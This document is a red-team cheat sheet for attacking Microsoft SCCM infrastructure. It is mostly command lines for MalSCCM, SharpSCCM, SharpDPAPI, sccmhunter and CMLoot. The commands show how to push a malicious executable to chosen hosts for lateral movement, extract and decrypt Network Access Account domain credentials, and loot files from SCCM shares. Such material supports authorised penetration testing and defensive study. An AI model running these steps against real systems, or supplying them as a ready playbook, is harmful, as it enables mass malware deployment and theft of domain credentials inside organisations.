# Deployment - SCCM

## Application Deployment

> SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.

* [PowerSCCM - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)
* [MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage](https://github.com/nettitude/MalSCCM)


* Using **SharpSCCM**
  ```ps1
  .\SharpSCCM.exe get device --server <SERVER8NAME> --site-code <SITE_CODE>
  .\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>
  .\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping 10.10.10.10" -s --debug
  ``` 
* Compromise client, use locate to find management server 
    ```ps1
    MalSCCM.exe locate
    ```
* Enumerate over WMI as an administrator of the Distribution Point
    ```ps1
    MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
    ```
* Compromise management server, use locate to find primary server
* Use `inspect` on primary server to view who you can target
    ```ps1
    MalSCCM.exe inspect /all
    MalSCCM.exe inspect /computers
    MalSCCM.exe inspect /primaryusers
    MalSCCM.exe inspect /groups
    ```
* Create a new device group for the machines you want to laterally move too
    ```ps1
    MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
    MalSCCM.exe inspect /groups
    ```

* Add your targets into the new group 
    ```ps1
    MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
    ```
* Create an application pointing to a malicious EXE on a world readable share : `SCCMContentLib$`
    ```ps1
    MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
    MalSCCM.exe inspect /applications
    ```

* Deploy the application to the target group 
    ```ps1
    MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
    MalSCCM.exe inspect /deployments
    ```
* Force the target group to checkin for updates 
    ```ps1
    MalSCCM.exe checkin /groupname:TargetGroup
    ```

* Cleanup the application, deployment and group
    ```ps1
    MalSCCM.exe app /cleanup /name:demoapp
    MalSCCM.exe group /delete /groupname:TargetGroup
    ```


## Network Access Accounts

> If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.

On the machine.
* Find SCCM blob
    ```ps1
    Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
    NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
    NetworkAccessUsername : <![CDATA[E600000001...00F92]]>
    ```
* Using [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244) or [Mayyhem/SharpSCCM](https://github.com/Mayyhem/SharpSCCM) for SCCM retrieval and decryption
    ```ps1
    .\SharpDPAPI.exe SCCM
    .\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
    ```
* Check ACL for the CIM repository located at `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`:
    ```ps1
    Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
    ConvertFrom-SddlString ""
    ```

From a remote machine.
* Using [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter)
    ```ps1
    python3 ./sccmhunter.py http -u "administrator" -p "P@ssw0rd" -d internal.lab -dc-ip 10.10.10.10. -auto
    ```


## SCCM Shares

> Find interesting files stored on (System Center) Configuration Manager (SCCM/CM) SMB shares

* [1njected/CMLoot](https://github.com/1njected/CMLoot)
  ```ps1
  Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
  Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
  Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
  ```


## References

* [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
* [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
* [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
* [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
* [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)